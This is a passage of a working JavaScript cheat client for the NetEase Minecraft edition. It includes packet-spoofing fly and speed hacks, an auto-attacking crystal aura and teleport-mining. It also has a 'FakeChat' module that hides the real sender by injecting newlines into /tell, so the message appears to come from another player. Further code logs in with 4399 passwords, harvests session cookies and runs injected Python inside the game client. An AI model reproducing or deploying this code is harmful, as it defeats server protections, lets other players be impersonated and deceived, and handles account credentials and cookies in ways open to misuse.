            let maxStack = (baseName === "ender_pearl" || baseName === "snowball" || baseName === "egg" || baseName === "bucket" || baseName === "sign" || baseName === "honey_bottle") ? 16 : 64;

            for (let i = 0; i < stacks.length - 1; i++) {
                let countI = getCount(stacks[i]);
                if (countI >= maxStack) continue;

                for (let j = i + 1; j < stacks.length; j++) {
                    let countJ = getCount(stacks[j]);
                    if (countJ <= 0) continue;

                    let space = maxStack - countI;
                    if (space <= 0) break;

                    generatedTasks.push({
                        type: "merge",
                        from: stacks[j].currentSlot,
                        to: stacks[i].currentSlot
                    });

                    let moveAmt = Math.min(space, countJ);
                    countI += moveAmt;
                    countJ -= moveAmt;

                    stacks[i].count = countI;
                    stacks[j].count = countJ;

                    if (countJ <= 0) {
                        inv[stacks[j].currentSlot] = null;
                    }
                }
            }
        }

        let bestSword = null;
        let bestAxe = null;

        for (let i = 0; i < inventorySize; i++) {
            let item = inv[i];
            if (!item) continue;
            let type = item.namespace.replace("minecraft:", "").split('_')[1] || "";
            if (type === "sword") {
                if (!bestSword) {
                    bestSword = item;
                } else {
                    let comp1 = compareObjs(item, bestSword);
                    let comp2 = compareObjs(bestSword, item);
                    if (comp1 === item && (comp2 !== bestSword || item.currentSlot < bestSword.currentSlot)) {
                        bestSword = item;
                    }
                }
            }
            if (type === "axe") {
                if (!bestAxe) {
                    bestAxe = item;
                } else {
                    let comp1 = compareObjs(item, bestAxe);
                    let comp2 = compareObjs(bestAxe, item);
                    if (comp1 === item && (comp2 !== bestAxe || item.currentSlot < bestAxe.currentSlot)) {
                        bestAxe = item;
                    }
                }
            }
        }

        const armorSlotMap = {
            helmet: 0,
            chestplate: 1,
            leggings: 2,
            boots: 3
        };
        let bestArmorObj = {
            0: armor[0],
            1: armor[1],
            2: armor[2],
            3: armor[3]
        };
        let bestArmorInvSlot = {
            0: -1,
            1: -1,
            2: -1,
            3: -1
        };

        if (typeof AutoArmor !== "undefined" && AutoArmor) {
            for (let i = 0; i < inventorySize; i++) {
                let item = inv[i];
                if (!item) continue;
                const type = (item.namespace || "").replace("minecraft:", "").split('_')[1];
                if (armorSlotMap[type] !== undefined) {
                    let aSlot = armorSlotMap[type];
                    let currentBest = bestArmorObj[aSlot];
                    if (!currentBest) {
                        bestArmorObj[aSlot] = item;
                        bestArmorInvSlot[aSlot] = i;
                    } else {
                        let comp1 = compareObjs(item, currentBest);
                        let comp2 = compareObjs(currentBest, item);
                        if (comp1 === item && (comp2 !== currentBest || item.currentSlot < currentBest.currentSlot)) {
                            bestArmorObj[aSlot] = item;
                            bestArmorInvSlot[aSlot] = i;
                        }
                    }
                }
            }
        }

        if (typeof AutoArmor !== "undefined" && AutoArmor) {
            for (let aSlot = 0; aSlot < 4; aSlot++) {
                let invSlot = bestArmorInvSlot[aSlot];
                if (invSlot !== -1 && inv[invSlot]) {
                    generatedTasks.push({
                        type: "equip",
                        slot: inv[invSlot].currentSlot,
                        armorSlot: aSlot
                    });
                    let oldArmor = armor[aSlot];
                    let newArmor = inv[invSlot];
                    armor[aSlot] = newArmor;
                    inv[invSlot] = oldArmor;
                    if (inv[invSlot]) inv[invSlot].currentSlot = invSlot;
                }
            }
        }

        const itemsToDiscard = [
            "fishing_rod", "wooden_pickaxe", "stone_pickaxe", "iron_pickaxe", "golden_pickaxe", "diamond_pickaxe", "netherite_pickaxe",
            "wooden_shovel", "stone_shovel", "iron_shovel", "golden_shovel", "diamond_shovel", "netherite_shovel",
            "wooden_hoe", "stone_hoe", "iron_hoe", "golden_hoe", "diamond_hoe", "netherite_hoe",
            "book", "enchanted_book", "chest", "experience_bottle", "lava_bucket", "water_bucket", "web", "firework_rocket", "flint_and_steel", "slime_ball"
        ];

        if (typeof Drop_Bow !== "undefined" && Drop_Bow) {
            itemsToDiscard.push("bow", "crossbow", "arrow");
        }

        function isJunk(item) {
            if (!item) return false;
            if (typeof Drop_Items !== "undefined" && !Drop_Items) return false;

            const name = item.namespace.replace("minecraft:", "");
            if (itemsToDiscard.includes(name)) return true;

            const type = name.split('_')[1] || name.split('_')[0];
            if (["helmet", "chestplate", "leggings", "boots"].includes(type)) {
                if (typeof AutoArmor !== "undefined" && AutoArmor) {
                    for (let aSlot = 0; aSlot < 4; aSlot++) {
                        if (bestArmorObj[aSlot] === item) return false;
                    }
                }
                return true;
            }
            if (type === "sword" && item !== bestSword) return true;
            if (type === "axe" && item !== bestAxe) return true;
            return false;
        }

        for (let i = 0; i < inventorySize; i++) {
            let item = inv[i];
            if (!item) continue;
            if (isJunk(item)) {
                generatedTasks.push({
                    type: "drop",
                    slot: item.currentSlot,
                    expectedId: item.namespace
                });
                inv[i] = null;
            }
        }

        function isBlock(name) {
            return name.includes("planks") || name.includes("log") || name.includes("stone") ||
                name.includes("dirt") || name.includes("sand") || name.includes("gravel") ||
                name.includes("obsidian") || name.includes("netherrack") || name.includes("brick");
        }

        let targetHotbar = new Array(9).fill(null);
        let assignedItems = new Set();
        if (bestSword) {
            targetHotbar[0] = bestSword;
            assignedItems.add(bestSword);
        }
        if (bestAxe) {
            targetHotbar[1] = bestAxe;
            assignedItems.add(bestAxe);
        }

        let pearls = [],
            enchApples = [],
            apples = [],
            blocks = [],
            projectiles = [];

        for (let i = 0; i < inventorySize; i++) {
            let item = inv[i];
            if (!item || getCount(item) <= 0 || assignedItems.has(item)) continue;

            const name = item.namespace.replace("minecraft:", "");
            if (name === "ender_pearl") pearls.push(item);
            else if (name === "enchanted_golden_apple" || (name === "golden_apple" && getEnchantLevel(item, '9s') > 0)) enchApples.push(item);
            else if (name === "golden_apple") apples.push(item);
            else if (isBlock(name)) blocks.push(item);
            else if (name === "snowball" || name === "egg") projectiles.push(item);
        }

        let getNextFree = () => {
            for (let i = 0; i < 9; i++)
                if (!targetHotbar[i]) return i;
            return -1;
        };

        let fillCat = (itemsArr, limit = 99) => {
            let c = 0;
            itemsArr.sort((a, b) => {
                let diff = (getCount(b) - getCount(a));
                if (diff !== 0) return diff;
                let aHot = a.currentSlot < 9 ? 1 : 0;
                let bHot = b.currentSlot < 9 ? 1 : 0;
                if (aHot !== bHot) return bHot - aHot;
                return a.currentSlot - b.currentSlot;
            });

            for (let item of itemsArr) {
                if (c >= limit) break;
                if (!item || getCount(item) <= 0 || assignedItems.has(item)) continue;
                if (item.currentSlot < 9 && targetHotbar[item.currentSlot] === null) {
                    targetHotbar[item.currentSlot] = item;
                    assignedItems.add(item);
                    c++;
                }
            }

            for (let item of itemsArr) {
                if (c >= limit) break;
                if (!item || getCount(item) <= 0 || assignedItems.has(item)) continue;
                let slot = getNextFree();
                if (slot !== -1) {
                    targetHotbar[slot] = item;
                    assignedItems.add(item);
                    c++;
                }
            }
        };

        fillCat(pearls);
        fillCat(enchApples);
        fillCat(apples);
        fillCat(blocks, 3);
        fillCat(projectiles);

        for (let i = 0; i < 9; i++) {
            let desiredItem = targetHotbar[i];
            if (!desiredItem) continue;
            if (inv[i] !== desiredItem) {
                let currentPos = desiredItem.currentSlot;
                if (inv[i]) {
                    generatedTasks.push({
                        type: "swap",
                        from: currentPos,
                        to: i
                    });
                } else {
                    generatedTasks.push({
                        type: "move",
                        from: currentPos,
                        to: i
                    });
                }
                let temp = inv[i];
                inv[i] = inv[currentPos];
                inv[currentPos] = temp;
                if (inv[i]) inv[i].currentSlot = i;
                if (inv[currentPos]) inv[currentPos].currentSlot = currentPos;
            }
        }

        if (generatedTasks.length > 0) {
            invManager_TaskQueue.push(...generatedTasks);
            DropTiming = 0;
            return;
        }
    }

    if (invManager_TaskQueue.length === 0 && ContainerOpenState !== "Hud") {
        if (invManager_Silence) {
            closeInventory();
            closeContainer();
        } else if (invManager_Automatic) {
            deleteContainer();
        }
        invManager_open_inventory = false;
    }
}
/*#背包整理*/

/*@飞行*/
function FlyFunc() {
    let Motion = getVector(Fly_Speed, self_rot.yaw, 270);
    let packetMotionY = 0;
    if (Fly_Snake) {
        packetMotionY = Fly_UD;
        Fly_UD = Fly_UD > 0 ? -Fly_SetUD : Fly_SetUD;
        if (!Fly_Packet) {
            Motion.y = Fly_UD;
        }
    } else {
        Motion.y = 0;
    }
    let newPos = {
        x: self_pos.x + Motion.x,
        y: Fly_Packet ? self_pos.y : self_pos.y + Motion.y,
        z: self_pos.z + Motion.z
    };
    if (getEntityFlag(self_id, 34)) {
        if (Fly_Pos) setEntityPos(self_id, newPos.x, newPos.y, newPos.z);
        if (Fly_Motion) setEntityMotion(self_id, Motion.x, Motion.y, Motion.z);
        if (Fly_Packet) {
            sendPlayerAuthInput({
                pos: {
                    x: newPos.x,
                    y: self_pos.y,
                    z: newPos.z
                },
                motion: {
                    x: 0,
                    y: packetMotionY,
                    z: 0
                }
            });
        }
    } else {
        setEntityPos(self_id, self_pos.x, self_pos.y, self_pos.z);
    }
}

/*#飞行*/

function JumpSpeed() {
    if (JumpSpeed_Enabled) {
        if ((Scaffold_Enabled && Scaffold_BJDSpeed) || (BJDSpeed_Enabled)) return;
        let input = InputVector
        let currentMotion = self_motion;
        let isSwimming = getEntityFlag(self_id, 56);
        let nowY = currentMotion ? currentMotion.y : 0;
        if ((input.y || 0) !== 0 || (input.x || 0) !== 0) {
            if (!isSwimming) {
                let forward = input.y || 0;
                let strafe = input.x || 0;
                let strafeCalc = Math.atan2(-strafe, forward);
                let strafeDeg = strafeCalc * (180 / Math.PI);
                let targetYaw = self_rot.yaw + strafeDeg;
                let moveRad = targetYaw * (Math.PI / 180);
                let motionX = JumpSpeed_Speed * Math.sin(-moveRad);
                let motionZ = JumpSpeed_Speed * Math.cos(-moveRad);
                if (getEntityIsGround(self_id)) {
                    nowY = JumpSpeed_Height;
                }
                setEntityMotion(self_id, motionX, nowY, motionZ);
                setSilentRot(self_rot.pitch, targetYaw + 180);
            }
        } else {
            if (currentMotion && (currentMotion.x !== 0 || currentMotion.z !== 0)) {
                if (!isSwimming) {
                    setEntityMotion(self_id, 0, nowY, 0);
                }
            }
        }
    }
}

function BJDFly() {
    if (BJDFly_Enabled) {
        const yawRad = ((self_rot.yaw + 90) * Math.PI) / 180;
        const pitchRad = (self_rot.pitch * Math.PI) / 180;
        const horizontal = BJDFly_Speed * Math.cos(pitchRad);
        const Motion = {
            x: horizontal * Math.cos(yawRad),
            y: -BJDFly_Speed * Math.sin(pitchRad),
            z: horizontal * Math.sin(yawRad)
        };
        if (getEntityFlag(self_id, 34)) {
            setEntityMotion(self_id, Motion.x, Motion.y, Motion.z);
        } else if (!getEntityIsGround(self_id)) {
            setEntityPos(self_id, self_pos.x, self_pos.y, self_pos.z);
        }
    }
}

function onCookieLoginRequestEvent(body) {
    if (CheckLogin) {
        if (NoOnlineKick_Enabled) {
            if (body.includes("LobbyGame")) {
                const LobbyGame = JSON.parse(body).netease_sid.split(':')[0];
                curl_post_game_api("https://g79apigatewayobt.minecraft.cn/online-lobby-room/get", JSON.stringify({
                    "room_id": LobbyGame
                }), function(Data_Code, Data_Res) {
                    const AnalysisData = JSON.parse(Data_Res);
                    if (AnalysisData && AnalysisData.code === 0 && AnalysisData.message === "正常返回" && AnalysisData.entity && AnalysisData.entity.owner_id) {
                        getLocalUID((error, uid) => {
                            if (error) {
                                return;
                            }
                            if (AnalysisData.entity.owner_id === uid) {
                                return;
                            }
                            if (NoOnlineKick_LobbyGame === null) NoOnlineKick_LobbyGame = LobbyGame;
                            curl_post_game_api("https://g79apigatewayobt.minecraft.cn/online-lobby-room-enter/leave-room", JSON.stringify({
                                "team_quit": false,
                                "room_id": LobbyGame
                            }), function(code, response) {});
                        });
                    }
                });
            }
        }
    }
}

/*@虚影障幕*/
function FillStructure() {
    if (Structure_Enabled) {
        const blocks = [];
        if (JsonMode) {
            if (_fs.exists(_app.getResource() + "/TimeUnity/文件.json")) {
                blocks.push(...JSON.parse(_fs.read(_app.getResource() + "/TimeUnity/文件.json")));
            } else {
                _fs.createDirectory(_app.getResource() + "/TimeUnity");
                _fs.write(_app.getResource() + "/TimeUnity/文件.json", JSON.stringify(defaultData));
                blocks.push(...defaultData);
            }
        }
        getPlayerList().forEach(Player => {
            if (NotMe && Player === self_id) return;
            if (target_self && Player != self_id) return;
            let PlayerPos = getEntityPos(Player);
            DelayTiming++;
            if (DelayTime <= DelayTiming) {
                if (CircleMode) {
                    MoveAngle += MoveSpeed;
                    if (MoveAngle >= 2 * Math.PI) MoveAngle = 0;
                }
                if (LockPos) {
                    const DataUse = LockPosData.length > 0 ? LockPosData : blocks;
                    DataUse.forEach(Pos => {
                        let SpinMovePos = {
                            x: Pos.x,
                            y: Pos.y,
                            z: Pos.z
                        };
                        if (CircleMode) {
                            SpinMovePos = {
                                x: Pos.x + Math.cos(MoveAngle) * MoveRadius,
                                y: Pos.y,
                                z: Pos.z + Math.sin(MoveAngle) * MoveRadius
                            };
                        }
                        sendPlayerAction({
                            id: self_id,
                            pos: {
                                x: Math.floor(SpinMovePos.x),
                                y: Math.floor(SpinMovePos.y),
                                z: Math.floor(SpinMovePos.z)
                            },
                            type: 17
                        });
                    });
                    if (LockPosData.length === 0 && blocks.length > 0) {
                        LockPosData = blocks;
                    }
                } else if (JsonMode && blocks.length > 0) {
                    LockPosData = [];
                    blocks.forEach(block => {
                        let SpinMovePos = {
                            x: PlayerPos.x + block.x + Xoffset - 5,
                            y: PlayerPos.y + block.y + Yoffset,
                            z: PlayerPos.z + block.z + Zoffset - 2
                        };
                        if (CircleMode) {
                            SpinMovePos = {
                                x: SpinMovePos.x + Math.cos(MoveAngle) * MoveRadius,
                                y: SpinMovePos.y,
                                z: SpinMovePos.z + Math.sin(MoveAngle) * MoveRadius
                            };
                        }
                        sendPlayerAction({
                            id: self_id,
                            pos: {
                                x: Math.floor(SpinMovePos.x),
                                y: Math.floor(SpinMovePos.y),
                                z: Math.floor(SpinMovePos.z)
                            },
                            type: 17
                        });
                        LockPosData.push(SpinMovePos);
                    });
                } else {
                    LockPosData = [];
                    for (let x = 0; x <= Xsize; x++) {
                        for (let y = 0; y <= Ysize; y++) {
                            for (let z = 0; z <= Zsize; z++) {
                                let SpinMovePos = {
                                    x: PlayerPos.x + x + Xoffset,
                                    y: PlayerPos.y + y + Yoffset,
                                    z: PlayerPos.z + z + Zoffset
                                };
                                if (CircleMode) {
                                    SpinMovePos = {
                                        x: SpinMovePos.x + Math.cos(MoveAngle) * MoveRadius,
                                        y: SpinMovePos.y,
                                        z: SpinMovePos.z + Math.sin(MoveAngle) * MoveRadius
                                    };
                                }
                                sendPlayerAction({
                                    id: self_id,
                                    pos: {
                                        x: Math.floor(SpinMovePos.x),
                                        y: Math.floor(SpinMovePos.y),
                                        z: Math.floor(SpinMovePos.z)
                                    },
                                    type: 17
                                });
                                LockPosData.push(SpinMovePos);
                            }
                        }
                    }
                }
                DelayTiming = 0;
            }
        });
    }
}
/*#虚影障幕*/

/*@自动破坏*/
function AutoBreak() {
    if (AutoBreak_Enabled) {
        AutoBreak_Tick++;
        if (AutoBreak_Tick < AutoBreak_Interval) return;
        const playerPos = self_pos;
        const baseY = Math.floor(playerPos.y);
        for (let dx = -AutoBreak_Range; dx <= AutoBreak_Range; dx++) {
            for (let dy = -AutoBreak_Range; dy <= AutoBreak_Range; dy++) {
                for (let dz = -AutoBreak_Range; dz <= AutoBreak_Range; dz++) {
                    const targetX = Math.floor(playerPos.x) + dx;
                    const targetY = baseY + dy;
                    const targetZ = Math.floor(playerPos.z) + dz;
                    const block = getBlock(targetX, targetY, targetZ);
                    if (block?.namespace === 'minecraft:air') continue;
                    PacketDestroys(targetX, targetY, targetZ);
                }
            }
        }
        AutoBreak_Tick = 0;
    }
}
/*#自动破坏*/

function CrystalAura() {
    try {
        getPlayerList().forEach(Player => {
            if (getEntityAttribute(Player, 'minecraft:health').current <= 0) return;
            if (Player === self_id) return;
            if (getText(getEntityCarriedItem(self_id), 'Name:"', '"') !== "minecraft:end_crystal") return;
            let PlayerPos = getEntityPos(Player);
            if (getRange(PlayerPos, self_pos) > CrystalAura_Range) return;
            const motion = getEntityMotion(Player);
            const speed = Math.sqrt(motion.x * motion.x + motion.z * motion.z);
            if (speed > 0.1) {
                PlayerPos = {
                    x: PlayerPos.x + motion.x * 0.5,
                    y: PlayerPos.y,
                    z: PlayerPos.z + motion.z * 0.5
                };
            }
            const RandomX = getRandomPos();
            const RandomZ = getRandomPos();
            let Player_PosY;
            const PlayerBlock = getBlock(PlayerPos.x, PlayerPos.y - 3, PlayerPos.z);
            if (PlayerPos.y >= 0) {
                Player_PosY = PlayerPos.y - 2;
            } else if (PlayerPos.y < 0) {
                Player_PosY = PlayerPos.y - 3;
            }
            if (PlayerBlock.namespace !== "minecraft:air" && Math.floor(self_pos.y) !== Math.floor(PlayerPos.y)) {
                Player_PosY = Player_PosY - 1;
            }
            if (CrystalAura_Range > 7) {
                sendPlayerAuthInput({
                    pos: {
                        x: PlayerPos.x + RandomX,
                        y: Player_PosY,
                        z: PlayerPos.z + RandomZ
                    }
                });
            }
            buildBlock(self_id, PlayerPos.x + RandomX, Player_PosY, PlayerPos.z + RandomZ, 1);
        });
        getEntityList().forEach(Entity => {
            if (CrystalAura_AttackCrystal) {
                if (getEntityAttribute(Entity, 'minecraft:health').current <= 0) return;
                if (getEntityNamespace(Entity) === "minecraft:ender_crystal") {
                    const EntityPos = getEntityPos(Entity);
                    if (getRange(EntityPos, self_pos) > 7) return;
                    attackEntity(Entity, false);
                }
            }
            if (CrystalAura_AttackEntity) {
                if (getEntityNamespace(Entity) === "minecraft:ender_crystal") return;
                const Entity_Pos = getEntityPos(Entity);
                const EntityType = getEntityNamespace(Entity);
                if (getRange(Entity_Pos, self_pos) > CrystalAura_Range) return;
                if (EntityType === 'minecraft:item' || EntityType === 'minecraft:xp_orb' || EntityType === 'netease:pet' || EntityType === 'minecraft:arrow' || EntityType === 'minecraft:thrown_trident') return;
                if (getText(getEntityCarriedItem(self_id), 'Name:"', '"') === "minecraft:end_crystal") {
                    const RandomX = getRandomPos();
                    const RandomZ = getRandomPos();
                    let Entity_PosY;
                    const EntityBlock = getBlock(Entity_Pos.x, Entity_Pos.y - 1.62, Entity_Pos.z);
                    if (Entity_Pos.y >= 0) {
                        Entity_PosY = Entity_Pos.y - 0.5;
                    } else if (Entity_Pos.y < 0) {
                        Entity_PosY = Entity_Pos.y - 1;
                    }
                    if (EntityBlock.namespace !== "minecraft:air" && Math.floor(self_pos.y) !== Math.floor(Entity_Pos.y + 1)) {
                        Entity_PosY = Entity_PosY - 1;
                    }
                    if (CrystalAura_Range > 7) {
                        sendPlayerAuthInput({
                            pos: {
                                x: Entity_Pos.x + RandomX,
                                y: Entity_PosY,
                                z: Entity_Pos.z + RandomZ
                            }
                        });
                    }
                    buildBlock(self_id, Entity_Pos.x + RandomX, Entity_PosY, Entity_Pos.z + RandomZ, 1);
                }
            }
        });
    } catch (e) {}
}

function FakeChat() {
    if (FakeChat_Enabled && _app.isInGame()) {
        FakeChatTiming++
        if (FakeChatTiming >= FakeChat_Delay * 2) {
            getWorldPlayerList().map(player => player.name).forEach(player => {
                sendCommandRequest(`/tell "${player}" §r\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<${FakeChat_Name}> ${FakeChat_Text}`);
            });
            FakeChatTiming = 0;
        }
    }
}

function AntiStarve() {
    if (AntiStarve_Enabled) {
        setEntityAttribute(self_id, "minecraft:player.hunger", {
            current: 100
        });
    }
}

async function Login4399Account(user, pass) {
    try {
        _app.showToast('等待服务器响应...');
        const result = await LoginBy4399Password(user, pass, "");
        Sauth_4399_Cookie = result;
        _app.evalPython(`from gui_2d import GUI
import application, setting, gui

def force_relogin():
    try:
        GUI.login_mgr.logout()
        gui.login_failcall(0)
        
    except Exception as e:
        pass

force_relogin()`);
        _app.showToast('请重新登录账号');
    } catch (error) {
        _app.showToast(error.message);
    }
}

async function get4399Cookie(user, pass) {
    try {
        _app.showToast('等待服务器响应...');
        const phlogact = generateRandomString(32, '0123456789abcdef');
        const result = await LoginBy4399Password(user, pass, phlogact);
        infiniteCookie_Cookie = result;
        _app.evalPython(`from gui_2d import GUI
import application, setting, gui

def force_relogin():
    try:
        GUI.login_mgr.logout()
        gui.login_failcall(0)
        
    except Exception as e:
        pass

force_relogin()`);
        _app.showToast('请重新登录账号');
    } catch (error) {
        _app.showToast(error);
    }
}

const TeleMine_TargetList = {
    'minecraft:coal_ore': '煤炭',
    'minecraft:deepslate_coal_ore': '煤炭',
    'minecraft:iron_ore': '铁',
    'minecraft:deepslate_iron_ore': '铁',
    'minecraft:copper_ore': '铜',
    'minecraft:deepslate_copper_ore': '铜',
    'minecraft:gold_ore': '金',
    'minecraft:deepslate_gold_ore': '金',
    'minecraft:redstone_ore': '红石',
    'minecraft:deepslate_redstone_ore': '红石',
    'minecraft:emerald_ore': '绿宝石',
    'minecraft:deepslate_emerald_ore': '绿宝石',
    'minecraft:lapis_ore': '青金石',
    'minecraft:deepslate_lapis_ore': '青金石',
    'minecraft:diamond_ore': '钻石',
    'minecraft:deepslate_diamond_ore': '钻石',
    'minecraft:nether_quartz_ore': '石英',
    'minecraft:nether_gold_ore': '金粒',
    'minecraft:ancient_debris': '远古残骸'
};

const LinkedMinerals = {
    "coal_ore": "deepslate_coal_ore",
    "deepslate_coal_ore": "coal_ore",
    "iron_ore": "deepslate_iron_ore",
    "deepslate_iron_ore": "iron_ore",
    "copper_ore": "deepslate_copper_ore",
    "deepslate_copper_ore": "copper_ore",
    "gold_ore": "deepslate_gold_ore",
    "deepslate_gold_ore": "gold_ore",
    "redstone_ore": "deepslate_redstone_ore",
    "deepslate_redstone_ore": "redstone_ore",
    "emerald_ore": "deepslate_emerald_ore",
    "deepslate_emerald_ore": "emerald_ore",
    "lapis_ore": "deepslate_lapis_ore",
    "deepslate_lapis_ore": "lapis_ore",
    "diamond_ore": "deepslate_diamond_ore",
    "deepslate_diamond_ore": "diamond_ore"
};

const MineralSwitches = new Map([
    ["coal_ore", false],
    ["deepslate_coal_ore", false],
    ["iron_ore", false],
    ["deepslate_iron_ore", false],
    ["copper_ore", false],
    ["deepslate_copper_ore", false],
    ["gold_ore", false],
    ["deepslate_gold_ore", false],
    ["redstone_ore", false],
    ["deepslate_redstone_ore", false],
    ["emerald_ore", false],
    ["deepslate_emerald_ore", false],
    ["lapis_ore", false],
    ["deepslate_lapis_ore", false],
    ["diamond_ore", false],
    ["deepslate_diamond_ore", false],
    ["nether_gold_ore", false],
    ["nether_quartz_ore", false],
    ["ancient_debris", false]
]);

let TeleMine_Range = 10;
let TeleMine_Speed = 20;
let TeleMine_PickupRange = 6;
let TeleMine_MaxWaitTime = 40;

function TeleMine() {
    if (typeof TeleMine_Enabled === 'undefined' || !TeleMine_Enabled) return;

    if (!TeleMine.Ctx) {
        const total = Math.pow(TeleMine_Range * 2 + 1, 3);
        TeleMine.Ctx = {
            CurrentX: -TeleMine_Range,
            CurrentY: -TeleMine_Range,
            CurrentZ: -TeleMine_Range,
            StartPos: {
                x: self_pos.x,
                y: self_pos.y,
                z: self_pos.z
            },
            LastKnownPos: {
                x: self_pos.x,
                y: self_pos.y,
                z: self_pos.z
            },
            TotalBlocks: total,
            ProcessedBlocks: 0,
            FoundBlocks: [],
            WaitTimer: 0,
            CurrentBlock: null,
            State: 0
        };
        _minecraft.clientMessage('开始扫描...');
    }

    const ctx = TeleMine.Ctx;

    const healthData = getEntityAttribute(self_id, 'minecraft:health');
    const currentHealth = healthData.current;

    if (currentHealth <= 0) {
        _app.executePluginCommand('/ww tp ' + ctx.LastKnownPos.x + ' ' + ctx.LastKnownPos.y + ' ' + ctx.LastKnownPos.z);
        return;
    } else {
        ctx.LastKnownPos = {
            x: self_pos.x,
            y: self_pos.y,
            z: self_pos.z
        };
    }

    if (ctx.State === 0) {
        let processedBatch = 0;
        let speedLimit = TeleMine_Speed * 20;

        while (processedBatch < speedLimit) {
            if (ctx.CurrentY > TeleMine_Range) {
                ctx.State = 1;
                _minecraft.clientMessage(`扫描完成，发现 ${ctx.FoundBlocks.length} 个目标`);
                break;
            }

            const tx = Math.floor(ctx.StartPos.x) + ctx.CurrentX;
            const ty = Math.floor(ctx.StartPos.y) + ctx.CurrentY;
            const tz = Math.floor(ctx.StartPos.z) + ctx.CurrentZ;

            const block = getBlock(tx, ty, tz);
            if (block) {
                const nameKey = block.namespace.replace('minecraft:', '');
                if (MineralSwitches.get(nameKey) === true) {
                    if (TeleMine_TargetList[block.namespace]) {
                        ctx.FoundBlocks.push({
                            x: tx,
                            y: ty,
                            z: tz,
                            id: block.namespace,
                            targetItemName: TeleMine_TargetList[block.namespace]
                        });
                    }
                }
            }

            ctx.CurrentX++;
            ctx.ProcessedBlocks++;
            processedBatch++;

            if (ctx.CurrentX > TeleMine_Range) {
                ctx.CurrentX = -TeleMine_Range;
                ctx.CurrentZ++;
            }
            if (ctx.CurrentZ > TeleMine_Range) {
                ctx.CurrentZ = -TeleMine_Range;
                ctx.CurrentY++;
            }
        }

        if (ctx.State === 0) {
            const percent = Math.floor((ctx.ProcessedBlocks / ctx.TotalBlocks) * 100);
            _minecraft.showTipMessage(`扫描进度: ${percent}% [找到: ${ctx.FoundBlocks.length}]`);
        }
    }

    if (ctx.State > 0) {
        if (!ctx.CurrentBlock) {
            if (ctx.FoundBlocks.length > 0) {
                ctx.FoundBlocks.sort(function(a, b) {
                    const da = Math.pow(a.x - self_pos.x, 2) + Math.pow(a.y - self_pos.y, 2) + Math.pow(a.z - self_pos.z, 2);
                    const db = Math.pow(b.x - self_pos.x, 2) + Math.pow(b.y - self_pos.y, 2) + Math.pow(b.z - self_pos.z, 2);
                    return da - db;
                });

                const nextBlock = ctx.FoundBlocks.shift();
                let isSafe = true;
                const offsets = [{
                        x: 0,
                        y: 1,
                        z: 0
                    }, {
                        x: 0,
                        y: -1,
                        z: 0
                    }, {
                        x: 1,
                        y: 0,
                        z: 0
                    },
                    {
                        x: -1,
                        y: 0,
                        z: 0
                    }, {
                        x: 0,
                        y: 0,
                        z: 1
                    }, {
                        x: 0,
                        y: 0,
                        z: -1
                    }
                ];

                for (let i = 0; i < offsets.length; i++) {
                    const o = offsets[i];
                    const nb = getBlock(nextBlock.x + o.x, nextBlock.y + o.y, nextBlock.z + o.z);
                    if (nb && (nb.namespace.includes('lava') || nb.namespace.includes('water'))) {
                        isSafe = false;
                        break;
                    }
                }

                if (isSafe) {
                    ctx.CurrentBlock = nextBlock;
                    ctx.WaitTimer = 0;
                    ctx.State = 1;
                } else {
                    ctx.CurrentBlock = null;
                }

            } else {
                ctx.State = 0;
                ctx.CurrentX = undefined;
                TeleMine.Ctx = null;
                _minecraft.clientMessage('所有任务完成');
                return;
            }
        }

        if (ctx.CurrentBlock) {
            const target = ctx.CurrentBlock;
            const tx = target.x;
            const ty = target.y;
            const tz = target.z;

            if (ctx.State === 1) {
                _app.executePluginCommand("/ww tp " + (tx + 0.5) + " " + ty + " " + (tz + 0.5));
                ctx.State = 2;
                ctx.WaitTimer = 0;
            }

            if (ctx.State === 2) {
                ctx.WaitTimer++;

                const head = getBlock(tx, ty + 1, tz);
                if (head && head.namespace !== "minecraft:air") {
                    TeleMineDestroy(tx, ty + 1, tz);
                }

                const current = getBlock(tx, ty, tz);
                if (current && current.namespace === "minecraft:air") {
                    ctx.State = 3;
                    ctx.WaitTimer = 0;
                } else {
                    if (ctx.WaitTimer % 5 === 0) {
                        TeleMineDestroy(tx, ty, tz);
                    }
                    if (ctx.WaitTimer > TeleMine_MaxWaitTime) {
                        ctx.CurrentBlock = null;
                        ctx.State = 1;
                    }
                }
            }

            if (ctx.State === 3) {
                ctx.WaitTimer++;
                let itemFound = false;
                const entities = getEntityList();
                const targetName = target.targetItemName;

                for (let i = 0; i < entities.length; i++) {
                    const eid = entities[i];
                    if (getEntityNamespace(eid) === "minecraft:item") {
                        const ePos = getEntityPos(eid);
                        if (!ePos) continue;

                        const dx = ePos.x - (tx + 0.5);
                        const dy = ePos.y - (ty + 0.5);
                        const dz = ePos.z - (tz + 0.5);
                        const dist = Math.sqrt(dx * dx + dy * dy + dz * dz);

                        if (dist <= TeleMine_PickupRange) {
                            const eName = getEntityName(eid);
                            if (eName && (eName === targetName || eName.includes(targetName))) {
                                const bAtItem = getBlock(Math.floor(ePos.x), Math.floor(ePos.y), Math.floor(ePos.z));
                                if (bAtItem && (bAtItem.namespace.includes('lava') || bAtItem.namespace.includes('water'))) {
                                    continue;
                                }

                                _app.executePluginCommand("/ww tp " + ePos.x + " " + ePos.y + " " + ePos.z);
                                _minecraft.showTipMessage("拾取: " + eName);
                                itemFound = true;
                                break;
                            }
                        }
                    }
                }

                if (itemFound || ctx.WaitTimer > 20) {
                    ctx.CurrentBlock = null;
                    ctx.State = 1;
                }
            }
        }
    }
}

function AntiInvis() {
    if (AntiInvis_Enabled) {
        getPlayerList().forEach(AntiInvis => {
            if (getEntityFlag(AntiInvis, 5)) {
                setEntityFlag(AntiInvis, 5, false);
                removeEntityEffect(AntiInvis, 14);
            }
        });
    }
}

/*@自杀光环*/
function SuicideAura() {
    if (SuicideAura_Enabled) {
        attackEntity(self_id, true);
    }
}
/*#自杀光环*/

function SetHand() {
    if (SetHand_Enabled) {
        if (Hand_Speed > 0) {
            setEntityEffect(self_id, {
                id: 3,
                duration: 2,
                amplifier: Hand_Speed,
                displayOnScreenTextureAnimation: false,
                noCounter: true,
                effectVisible: false
            });
        }
        if (Hand_Speed < 0) {
            setEntityEffect(self_id, {
                id: 4,
                duration: 2,
                amplifier: -Hand_Speed,
                displayOnScreenTextureAnimation: false,
                noCounter: true,
                effectVisible: false
            });
        }
    }
}

function NoOnlineKick_Game() {
    getLocalUID((error, uid) => {
        if (error) {
            _app.showToast("重新加入房间生效");
            return;
        }
